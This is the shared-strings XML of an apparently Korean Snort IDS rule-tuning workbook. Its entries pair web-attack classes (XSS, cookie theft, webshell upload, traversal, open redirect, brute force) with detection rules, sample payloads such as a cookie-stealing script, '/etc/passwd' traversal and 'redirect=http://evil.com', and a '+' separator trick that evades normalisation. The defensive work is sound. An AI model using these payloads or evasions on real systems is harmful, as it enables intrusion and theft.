    <t>img/svg/iframe 등 태그 벡터 XSS 시그니처를 정규화 버퍼(http_uri(/U))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[XSS] Markup vector (img/svg/iframe...) (URI)"; flow:established,to_server; pcre:"/&lt;\s*(img|svg|iframe|body|object|embed|video|audio|details|marquee|input|form)\b[^&gt;]*(\son\w+\s*=|src\s*=\s*[\x22\x27]?\s*(javascript|data))/Ui"; classtype:web-application-attack; sid:1001008; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">keyword=&lt;svg onload=alert(1)&gt; </t>
  </si>
  <si>
    <t>T-035</t>
  </si>
  <si>
    <t>img/svg/iframe 등 태그 벡터 XSS — POST 본문 경로</t>
  </si>
  <si>
    <t>img/svg/iframe 등 태그 벡터 XSS 공격을 시그니처로 탐지하지 못하면 미탐 — POST 본문 경로에 대한 탐지 커버리지 필요. 예) keyword=&lt;svg onload=alert(1)&gt;</t>
  </si>
  <si>
    <t>img/svg/iframe 등 태그 벡터 XSS 시그니처를 정규화 버퍼(http_client_body(/P))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[XSS] Markup vector (img/svg/iframe...) (body)"; flow:established,to_server; pcre:"/&lt;\s*(img|svg|iframe|body|object|embed|video|audio|details|marquee|input|form)\b[^&gt;]*(\son\w+\s*=|src\s*=\s*[\x22\x27]?\s*(javascript|data))/Pi"; classtype:web-application-attack; sid:1001009; rev:1;)</t>
  </si>
  <si>
    <t>T-036</t>
  </si>
  <si>
    <t>쿠키/DOM 탈취(document.cookie/new Image().src) — URL 파라미터(GET) 경로</t>
  </si>
  <si>
    <t>쿠키/DOM 탈취(document.cookie/new Image().src) 공격을 시그니처로 탐지하지 못하면 미탐 — URL 파라미터(GET) 경로에 대한 탐지 커버리지 필요. 예) keyword=&lt;script&gt;new Image().src='//x/?'+document.cookie&lt;/script&gt;</t>
  </si>
  <si>
    <t>쿠키/DOM 탈취(document.cookie/new Image().src) 시그니처를 정규화 버퍼(http_uri(/U))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[XSS] Cookie/DOM exfiltration (URI)"; flow:established,to_server; pcre:"/(document\.cookie|document\.location|window\.location|document\.write|\.innerHTML\s*=|new\s+Image\s*\(|\.src\s*=)/Ui"; classtype:web-application-attack; sid:1001010; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">keyword=&lt;script&gt;new Image().src='//x/?'+document.cookie&lt;/script&gt; </t>
  </si>
  <si>
    <t>T-037</t>
  </si>
  <si>
    <t>쿠키/DOM 탈취(document.cookie/new Image().src) — POST 본문 경로</t>
  </si>
  <si>
    <t>쿠키/DOM 탈취(document.cookie/new Image().src) 공격을 시그니처로 탐지하지 못하면 미탐 — POST 본문 경로에 대한 탐지 커버리지 필요. 예) keyword=&lt;script&gt;new Image().src='//x/?'+document.cookie&lt;/script&gt;</t>
  </si>
  <si>
    <t>쿠키/DOM 탈취(document.cookie/new Image().src) 시그니처를 정규화 버퍼(http_client_body(/P))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[XSS] Cookie/DOM exfiltration (body)"; flow:established,to_server; pcre:"/(document\.cookie|document\.location|window\.location|document\.write|\.innerHTML\s*=|new\s+Image\s*\(|\.src\s*=)/Pi"; classtype:web-application-attack; sid:1001011; rev:1;)</t>
  </si>
  <si>
    <t>T-038</t>
  </si>
  <si>
    <t>실행 함수 페이로드(alert/eval/fetch) — URL 파라미터(GET) 경로</t>
  </si>
  <si>
    <t>실행 함수 페이로드(alert/eval/fetch) 공격을 시그니처로 탐지하지 못하면 미탐 — URL 파라미터(GET) 경로에 대한 탐지 커버리지 필요. 예) keyword=&lt;script&gt;eval(atob('...'))&lt;/script&gt;</t>
  </si>
  <si>
    <t>실행 함수 페이로드(alert/eval/fetch) 시그니처를 정규화 버퍼(http_uri(/U))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[XSS] Script execution payload (URI)"; flow:established,to_server; pcre:"/&lt;[^&gt;]*?(alert|prompt|confirm|eval|fetch|atob|String\.fromCharCode)\s*\(/Ui"; classtype:web-application-attack; sid:1001012; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">keyword=&lt;script&gt;eval(atob('...'))&lt;/script&gt; </t>
  </si>
  <si>
    <t>T-039</t>
  </si>
  <si>
    <t>실행 함수 페이로드(alert/eval/fetch) — POST 본문 경로</t>
  </si>
  <si>
    <t>실행 함수 페이로드(alert/eval/fetch) 공격을 시그니처로 탐지하지 못하면 미탐 — POST 본문 경로에 대한 탐지 커버리지 필요. 예) keyword=&lt;script&gt;eval(atob('...'))&lt;/script&gt;</t>
  </si>
  <si>
    <t>실행 함수 페이로드(alert/eval/fetch) 시그니처를 정규화 버퍼(http_client_body(/P))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[XSS] Script execution payload (body)"; flow:established,to_server; pcre:"/&lt;[^&gt;]*?(alert|prompt|confirm|eval|fetch|atob|String\.fromCharCode)\s*\(/Pi"; classtype:web-application-attack; sid:1001013; rev:1;)</t>
  </si>
  <si>
    <t>T-040</t>
  </si>
  <si>
    <t>[Upload] Dangerous executable extension — 멀티파트 업로드 본문</t>
  </si>
  <si>
    <t>[Upload] Dangerous executable extension 공격을 시그니처로 탐지하지 못하면 미탐 — 멀티파트 업로드 본문에 대한 탐지 커버리지 필요. 예)</t>
  </si>
  <si>
    <t>[Upload] Dangerous executable extension 시그니처를 정규화 버퍼(http_client_body(/P))에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[Upload] Dangerous executable extension (multipart)"; flow:established,to_server; content:"Content-Disposition"; nocase; http_client_body; content:"filename"; nocase; http_client_body; pcre:"/filename\s*=\s*[\x22\x27]?[^\x22\x27]+\.(php[3457s]?|phtml|jsp[afx]?|aspx?|cer|cfm|sh|exe|dll|bat|cgi|pl|py)\b/P"; classtype:web-application-attack; sid:1002001; rev:1;)</t>
  </si>
  <si>
    <t>T-041</t>
  </si>
  <si>
    <t>이중확장자/널바이트로 업로드 필터 우회 — 요청 전반</t>
  </si>
  <si>
    <t>이중확장자/널바이트로 업로드 필터 우회 공격을 시그니처로 탐지하지 못하면 미탐 — 요청 전반에 대한 탐지 커버리지 필요. 예) filename=shell.php.jpg / shell.jsp%00.jpg</t>
  </si>
  <si>
    <t>이중확장자/널바이트로 업로드 필터 우회 시그니처를 정규화 버퍼(해당 버퍼)에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[Upload] Double-extension or null-byte evasion"; flow:established,to_server; content:"filename"; nocase; http_client_body; pcre:"/filename\s*=\s*[\x22\x27]?[^\x22\x27]+\.(php|jsp|asp|aspx|sh|exe)(%00|\x00|\.)/P"; classtype:web-application-attack; sid:1002002; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">filename=shell.php.jpg / shell.jsp%00.jpg </t>
  </si>
  <si>
    <t>T-042</t>
  </si>
  <si>
    <t>업로드 본문 내 웹셸 코드(&lt;%@ page, Runtime.exec 등) — 요청 전반</t>
  </si>
  <si>
    <t>업로드 본문 내 웹셸 코드(&lt;%@ page, Runtime.exec 등) 공격을 시그니처로 탐지하지 못하면 미탐 — 요청 전반에 대한 탐지 커버리지 필요. 예) 본문 Runtime.getRuntime().exec(...) / &lt;%@ page %&gt;</t>
  </si>
  <si>
    <t>업로드 본문 내 웹셸 코드(&lt;%@ page, Runtime.exec 등) 시그니처를 정규화 버퍼(해당 버퍼)에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[Upload] Webshell code signature"; flow:established,to_server; pcre:"/(eval\s*\(\s*\x24_(post|get|request)|system\s*\(|passthru\s*\(|shell_exec\s*\(|base64_decode\s*\(\s*\x24|Runtime\.getRuntime\(\)\.exec|getRuntime\(\)|pageContext\.getRequest|&lt;\x25@\s*page)/P"; classtype:web-application-attack; sid:1002003; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">본문 Runtime.getRuntime().exec(...) / &lt;%@ page %&gt; </t>
  </si>
  <si>
    <t>T-043</t>
  </si>
  <si>
    <t>경로조작 ../ 및 인코딩 변형(%2e%2e,%c0%af) 원본 탐지 — 요청 전반</t>
  </si>
  <si>
    <t>경로조작 ../ 및 인코딩 변형(%2e%2e,%c0%af) 원본 탐지 공격을 시그니처로 탐지하지 못하면 미탐 — 요청 전반에 대한 탐지 커버리지 필요. 예) fileName=../../../../etc/passwd / %2e%2e%2f</t>
  </si>
  <si>
    <t>경로조작 ../ 및 인코딩 변형(%2e%2e,%c0%af) 원본 탐지 시그니처를 정규화 버퍼(해당 버퍼)에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[Download] Directory traversal (encoded/raw)"; flow:established,to_server; pcre:"/(\.\.[\x2f\x5c]|%2e%2e[\x2f\x5c%]|%252e%252e|\.\.%c0%af|\.\.%c1%9c)/i"; classtype:web-application-attack; sid:1002004; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">fileName=../../../../etc/passwd / %2e%2e%2f </t>
  </si>
  <si>
    <t>T-044</t>
  </si>
  <si>
    <t>정규화 URI에서 ../ 경로조작 탐지 — 요청 전반</t>
  </si>
  <si>
    <t>정규화 URI에서 ../ 경로조작 탐지 공격을 시그니처로 탐지하지 못하면 미탐 — 요청 전반에 대한 탐지 커버리지 필요. 예) path=../../web.xml</t>
  </si>
  <si>
    <t>정규화 URI에서 ../ 경로조작 탐지 시그니처를 정규화 버퍼(해당 버퍼)에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[Download] Directory traversal (URI norm)"; flow:established,to_server; pcre:"/\.\.[\x2f\x5c]/U"; classtype:web-application-attack; sid:1002005; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">path=../../web.xml </t>
  </si>
  <si>
    <t>T-045</t>
  </si>
  <si>
    <t>민감파일 접근(/etc/passwd, web.config, .env, .git) — 요청 전반</t>
  </si>
  <si>
    <t>민감파일 접근(/etc/passwd, web.config, .env, .git) 공격을 시그니처로 탐지하지 못하면 미탐 — 요청 전반에 대한 탐지 커버리지 필요. 예) fileName=/etc/passwd</t>
  </si>
  <si>
    <t>민감파일 접근(/etc/passwd, web.config, .env, .git) 시그니처를 정규화 버퍼(해당 버퍼)에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[Download] Sensitive file access"; flow:established,to_server; pcre:"/(\/etc\/(passwd|shadow|hosts)|win\.ini|boot\.ini|web\.config|web-inf\/web\.xml|\.env\b|\.git\/config|wp-config\.php|\/proc\/self\/environ|backup\.(zip|tar|sql))/Ui"; classtype:web-application-attack; sid:1002006; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">fileName=/etc/passwd </t>
  </si>
  <si>
    <t>T-046</t>
  </si>
  <si>
    <t>권한 파라미터 주입/Mass Assignment(role=ADMIN 등) — URL 파라미터(GET) 경로</t>
  </si>
  <si>
    <t>role=ADMIN, MEMBER_GRADE=ADMIN 등 권한 상향 파라미터가 URL 경로에서 미탐</t>
  </si>
  <si>
    <t>[미탐→개선] 권한키=관리자값 탐지 룰 신규(URL 파라미터)</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[Authz] Privilege parameter injection (URI)"; flow:established,to_server; pcre:"/[?\x26\x22\x27\s,]?(is_?admin|role|member_?grade|grade|authority|user_?type|privilege|is_superuser)\s*(=|\x22\s*:\s*\x22?)\s*[\x22\x27]?(admin|administrator|root|superuser|super|manager)\b/Ui"; classtype:web-application-attack; sid:1003001; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">?role=ADMIN </t>
  </si>
  <si>
    <t>T-047</t>
  </si>
  <si>
    <t>권한 파라미터 주입/Mass Assignment(role=ADMIN 등) — POST 본문 경로</t>
  </si>
  <si>
    <t>동일 권한 파라미터 주입이 회원가입/수정 POST 본문에서 미탐</t>
  </si>
  <si>
    <t>[미탐→개선] 권한키=관리자값 탐지 룰 신규(POST 본문)</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[Authz] Privilege parameter injection (body)"; flow:established,to_server; pcre:"/[?\x26\x22\x27\s,]?(is_?admin|role|member_?grade|grade|authority|user_?type|privilege|is_superuser)\s*(=|\x22\s*:\s*\x22?)\s*[\x22\x27]?(admin|administrator|root|superuser|super|manager)\b/Pi"; classtype:web-application-attack; sid:1003002; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">본문 role=ADMIN </t>
  </si>
  <si>
    <t>T-048</t>
  </si>
  <si>
    <t>오픈 리다이렉트(외부 절대 URL 주입) — URL 파라미터(GET) 경로</t>
  </si>
  <si>
    <t>redirect/returnUrl 등에 외부 절대 URL 주입(피싱 연계)이 URL 경로에서 미탐</t>
  </si>
  <si>
    <t>[미탐→개선] 리다이렉트 파라미터=외부 http(s):// 탐지 룰 신규(URL)</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[Redirect] Open redirect to external URL (URI)"; flow:established,to_server; pcre:"/(redirect(_?uri|url)?|return_?url|return|url|next|dest(ination)?|target|goto|continue|callback)\s*=\s*(https?:(\x2f\x2f|\/{2})|\/{2}\w)/Ui"; classtype:web-application-attack; sid:1003003; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">?redirect=http://evil.com </t>
  </si>
  <si>
    <t>T-049</t>
  </si>
  <si>
    <t>오픈 리다이렉트(외부 절대 URL 주입) — POST 본문 경로</t>
  </si>
  <si>
    <t>동일 오픈 리다이렉트가 POST 본문 경로에서 미탐</t>
  </si>
  <si>
    <t>[미탐→개선] 리다이렉트 파라미터=외부 http(s):// 탐지 룰 신규(본문)</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[Redirect] Open redirect to external URL (body)"; flow:established,to_server; pcre:"/(redirect(_?uri|url)?|return_?url|return|url|next|dest(ination)?|target|goto|continue|callback)\s*=\s*(https?:(\x2f\x2f|\/{2})|\/{2}\w)/Pi"; classtype:web-application-attack; sid:1003004; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">본문 redirect=http://evil.com </t>
  </si>
  <si>
    <t>T-050</t>
  </si>
  <si>
    <t>로그인/회원가입 무차별 대입(임계치) — 요청 전반</t>
  </si>
  <si>
    <t>/loginAction.do 반복 로그인(무차별 대입) 탐지 임계 룰 부재로 미탐</t>
  </si>
  <si>
    <t>[미탐→개선] 출발지 IP 60초 20회↑ detection_filter 룰 신규</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[Auth] Login/Join brute-force (rate)"; flow:established,to_server; content:"POST"; nocase; http_method; pcre:"/(loginaction|loginprocess|\/login|\/signin|\/auth|joinaction)/Ui"; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1003005; rev:1;)</t>
  </si>
  <si>
    <t>로그인 20회 초과 → 발동 / 단발 → 미발동(임계치)</t>
  </si>
  <si>
    <t>T-051</t>
  </si>
  <si>
    <t>URL 내 세션ID 노출(세션 고정 흔적, 저신뢰) — 요청 전반</t>
  </si>
  <si>
    <t>URL 내 세션ID 노출(세션 고정 흔적, 저신뢰) 공격을 시그니처로 탐지하지 못하면 미탐 — 요청 전반에 대한 탐지 커버리지 필요. 예) ...;jsessionid=ATTACKERSET</t>
  </si>
  <si>
    <t>URL 내 세션ID 노출(세션 고정 흔적, 저신뢰) 시그니처를 정규화 버퍼(해당 버퍼)에서 탐지</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[Session] Session ID in URL (possible fixation)"; flow:established,to_server; pcre:"/[\x3b?\x26](jsessionid|phpsessid|sessionid|asp\.net_sessionid)=/Ui"; classtype:web-application-attack; sid:1003006; rev:1;)</t>
  </si>
  <si>
    <t xml:space="preserve">...;jsessionid=ATTACKERSET </t>
  </si>
  <si>
    <t>T-052</t>
  </si>
  <si>
    <t>로그인/회원가입 무차별 대입(임계치 기반 탐지)</t>
  </si>
  <si>
    <t>튜닝개선</t>
  </si>
  <si>
    <t>V2의 detection_filter(20회/60초)는 임계 초과 '이후 매 요청마다' 알림 생성 → 동일 출발지에서 알림 폭주.</t>
  </si>
  <si>
    <t xml:space="preserve">detection_filter → threshold:type both로 변경(count 20→10, seconds 60→30). 'type threshold'는 30초 창에서 10번째 이벤트마다 1회 알림 → 매 요청 알림 대비 빈도 감소. rev 1→2. </t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[YANUS CUSTOM] [Auth] Login/Join brute-force (rate)"; flow:established,to_server; content:"POST"; nocase; http_method; pcre:"/(loginaction|loginprocess|\/login|\/signin|\/auth|joinaction)/Ui"; threshold:type both, track by_src, count 10, seconds 30; classtype:attempted-recon; sid:1003005; rev:2;)</t>
  </si>
  <si>
    <t>로그인 10회 초과 → 발동 / 단발 → 미발동(임계치)</t>
  </si>
  <si>
    <t>적용(검증)</t>
  </si>
  <si>
    <t>T-053</t>
  </si>
  <si>
    <t>XSS 인라인 이벤트핸들러 탐지 (URI)</t>
  </si>
  <si>
    <t>태그-속성 구분자로 공백 대신 '+'(폼 인코딩) 또는 '/'를 쓰면 우회. 예) NAME=%3Csvg+onload%3Dalert%281%29%3E → Snort /U 정규화는 %XX만 디코딩하고 '+'→공백 변환은 안 하므로 버퍼에 '&lt;svg+onload=...&gt;'(리터럴 +)가 남아 \son(공백 필요) 패턴이 어긋나 미탐. 반면 앱(Spring)은 '+'를 공백으로 디코딩해 '&lt;svg onload=...&gt;'로 실제 실행됨(앱은 실행, IDS는 미탐).</t>
  </si>
  <si>
    <t>구분자 클래스 확장: \son\w+ → [\s\x2f\x2b]on\w+ (공백뿐 아니라 '/'·'+'를 구분자로 허용). 함수 호출이 없는 핸들러형(&lt;svg+onload=location=...&gt;)·슬래시 변형(&lt;svg/onload=&gt;)도 탐지.</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[YANUS CUSTOM] [XSS] Inline event handler (URI)"; flow:established,to_server; pcre:"/&lt;\s*[a-z][a-z0-9]*\b[^&gt;]*[\s\x2f\x2b]on\w+\s*=/Ui"; classtype:web-application-attack; sid:1001004; rev:2;)</t>
  </si>
  <si>
    <t>&lt;svg+onload=...&gt;, &lt;svg/onload=...&gt;, &lt;svg onload=...&gt; 모두 탐지 / 정상(&lt;b&gt;bold&lt;/b&gt;, 'version+online=ok', '/path/onsale=1') 미탐 확인 / snort -T 통과</t>
  </si>
  <si>
    <t>T-054</t>
  </si>
  <si>
    <t>XSS 인라인 이벤트핸들러 탐지 (본문)</t>
  </si>
  <si>
    <t>T-055</t>
  </si>
  <si>
    <t>XSS 마크업 벡터(img/svg/iframe…) 탐지 (URI)</t>
  </si>
  <si>
    <t>태그-속성 구분자로 공백 대신 '+'(폼 인코딩) 또는 '/'를 쓰면 우회. 예) NAME=%3Csvg+onload%3Dalert%281%29%3E → Snort /U 정규화는 %XX만 디코딩하고 '+'→공백 변환은 안 하므로 버퍼에 '&lt;svg+onload=...&gt;'(리터럴 +)가 남아 \son(공백 필요) 패턴이 어긋나 미탐. 반면 앱(Spring)은 '+'를 공백으로 디코딩해 '&lt;svg onload=...&gt;'로 실제 실행됨(앱은 실행, IDS는 미탐). 마크업 벡터 룰도 동일하게 '+'/'/'에서 핸들러 분기 미탐.</t>
  </si>
  <si>
    <t>구분자 클래스 확장: (\son\w+ 분기) → [\s\x2f\x2b]on\w+ (공백뿐 아니라 '/'·'+'를 구분자로 허용). 함수 호출이 없는 핸들러형(&lt;svg+onload=location=...&gt;)·슬래시 변형(&lt;svg/onload=&gt;)도 탐지.</t>
  </si>
  <si>
    <t>alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"[YANUS CUSTOM] [XSS] Markup vector (img/svg/iframe...) (URI)"; flow:established,to_server; pcre:"/&lt;\s*(img|svg|iframe|body|object|embed|video|audio|details|marquee|input|form)\b[^&gt;]*([\s\x2f\x2b]on\w+\s*=|src\s*=\s*[\x22\x27]?\s*(javascript|data))/Ui"; classtype:web-application-attack; sid:1001008; rev:2;)</t>
  </si>
  <si>
    <t>T-056</t>
  </si>
  <si>
    <t>XSS 마크업 벡터(img/svg/iframe…) 탐지 (본문)</t>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <b/>
        <color rgb="FF1F3864"/>
        <sz val="14.0"/>
      </rPr>
      <t xml:space="preserve">탐지 </t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <b/>
        <color rgb="FF1F3864"/>
        <sz val="14.0"/>
      </rPr>
      <t xml:space="preserve">· </t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <b/>
        <color rgb="FF1F3864"/>
        <sz val="14.0"/>
      </rPr>
      <t>오탐 통계 요약</t>
    </r>
  </si>
  <si>
    <t>탐지 · 오탐 통계 요약(룰 수정 후)</t>
  </si>
  <si>
    <t>탐지 · 오탐 통계 요약(룰 2차수정 후)</t>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color rgb="FF808080"/>
        <sz val="9.0"/>
      </rPr>
      <t>※ '</t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color rgb="FF808080"/>
        <sz val="9.0"/>
      </rPr>
      <t>오탐기록대장</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color rgb="FF808080"/>
        <sz val="9.0"/>
      </rPr>
      <t xml:space="preserve">' </t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color rgb="FF808080"/>
        <sz val="9.0"/>
      </rPr>
      <t>시트 입력에 따라 자동 집계됩니다</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color rgb="FF808080"/>
        <sz val="9.0"/>
      </rPr>
      <t>.</t>
    </r>
  </si>
  <si>
    <t>구분</t>
  </si>
  <si>
    <t>값</t>
  </si>
  <si>
    <t>총 탐지 기록 건수</t>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">정탐 </t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t>(TP)</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">정탐 </t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t>(TP)</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">정탐 </t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t>(TP)</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">오탐 </t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t>(FP)</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">오탐 </t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t>(FP)</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">오탐 </t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t>(FP)</t>
    </r>
  </si>
  <si>
    <t>미판정</t>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <b/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">오탐률 </t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <b/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t>(</t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <b/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t>오탐</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <b/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t>/</t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <b/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t>판정완료</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <b/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t>)</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <b/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">오탐률 </t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <b/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t>(</t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <b/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t>오탐</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <b/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t>/</t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <b/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t>판정완료</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <b/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t>)</t>
    </r>
  </si>
  <si>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <b/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t xml:space="preserve">오탐률 </t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <b/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t>(</t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <b/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t>오탐</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <b/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t>/</t>
    </r>
    <r>
      <rPr>
        <rFont val="Noto Sans CJK SC"/>
        <b/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t>판정완료</t>
    </r>
    <r>
      <rPr>
        <rFont val="Arial"/>
        <b/>
        <color rgb="FF000000"/>
        <sz val="10.0"/>
      </rPr>
      <t>)</t>
    </r>
  </si>
  <si>
    <t>심각도별 분포</t>
  </si>
  <si>
    <t>건수</t>
  </si>
  <si>
    <t>LOW</t>
  </si>
  <si>
    <t>INFO</t>
  </si>
  <si>
    <t>룰 튜닝 진행 현황</t>
  </si>
  <si>
    <t>대기</t>
  </si>
  <si>
    <t>적용</t>
  </si>
  <si>
    <t>검증중</t>
  </si>
  <si>
    <t>보류</t>
  </si>
  <si>
    <t>튜닝 등록 총건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</si>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</sst>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. M. d am/pm h:mm:ss"/>
    <numFmt numFmtId="165" formatCode="yyyy-mm-dd"/>
    <numFmt numFmtId="166" formatCode="0.0%"/>
  </numFmts>
  <fonts count="27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rgb="FF1F3864"/>
      <name val="Arial"/>
    </font>
    <font>
      <sz val="10.0"/>
      <color rgb="FF595959"/>
      <name val="Noto Sans"/>
    </font>
    <font>
      <b/>
      <sz val="10.0"/>
      <color rgb="FF1F3864"/>
      <name val="Arial"/>
    </font>
    <font>
      <sz val="10.0"/>
      <color theme="1"/>
      <name val="Arial"/>
    </font>
    <font>
      <b/>
      <sz val="10.0"/>
